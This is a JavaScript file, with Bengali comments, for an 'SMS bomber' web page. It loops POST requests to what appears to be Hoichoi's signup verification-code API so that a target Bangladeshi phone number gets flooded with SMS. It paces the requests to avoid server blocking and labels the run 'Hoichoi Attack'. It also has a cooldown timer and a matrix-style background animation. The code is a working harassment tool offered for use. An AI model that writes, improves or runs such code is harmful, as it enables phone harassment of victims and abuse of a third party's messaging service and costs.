let isCooldown = false; 

// ১. পেজ লোড হওয়ার সময় আগের টাইমার চেক করা
window.onload = function() {
    const savedCooldownTime = localStorage.getItem('cooldownEndTime');
    if (savedCooldownTime) {
        const currentTime = Date.now();
        if (currentTime < savedCooldownTime) {
            const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
            activateCooldown(remainingTime);
        }
    }
};

async function startProcess() {
    const target = document.getElementById('target').value;
    const count = parseInt(document.getElementById('count').value);
    const display = document.getElementById('display');

    if (isCooldown) { 
        display.innerText = "Wait for cooldown!"; 
        return; 
    }

    if(!target || !count) { 
        display.innerText = "Enter target & amount!"; 
        return; 
    }

    display.innerText = "Hoichoi Attack Started...";
    
    for (let i = 1; i <= count; i++) {
        try { 
            // Hoichoi POST API
            // আপনার স্ক্রিনশট অনুযায়ী সঠিক পেলোড ফরম্যাট
            await fetch('https://prod-api.hoichoi.dev/core/api/v1/auth/signup/code', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify({ 
                    "phoneNumber": "+88" + target 
                }),
                mode: 'cors'
            });

            display.innerText = "SMS Sent: " + i;
            
            // ১০০% এসএমএস নিশ্চিত করতে ১০ সেকেন্ড বিরতি (সার্ভার ব্লক এড়াতে)
            await new Promise(res => setTimeout(res, 10000)); 
            
        } catch (e) {
            console.log("Error in attempt " + i);
        }
    }

    // ২. কাজ শেষে ৬০ সেকেন্ডের টাইমার সেট করা
    const cooldownEndTime = Date.now() + 60000;
    localStorage.setItem('cooldownEndTime', cooldownEndTime);
    activateCooldown(60);
}

function activateCooldown(seconds) {
    isCooldown = true;
    let timeLeft = seconds;
    const timer = setInterval(() => {
        timeLeft--;
        document.getElementById('display').innerText = `Wait: ${timeLeft}s`;
        if (timeLeft <= 0) {
            clearInterval(timer);
            isCooldown = false;
            localStorage.removeItem('cooldownEndTime');
            document.getElementById('display').innerText = "Ready!";
        }
    }, 1000);
}

// ৩. ম্যাট্রিক্স ব্যাকগ্রাউন্ড অ্যানিমেশন (আপনার সাইটের স্টাইল)
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const letters = "0123456789ABCDEF";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#ff0000"; // আপনি চাইলে সবুজ #00ff00 ও দিতে পারেন
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 33);
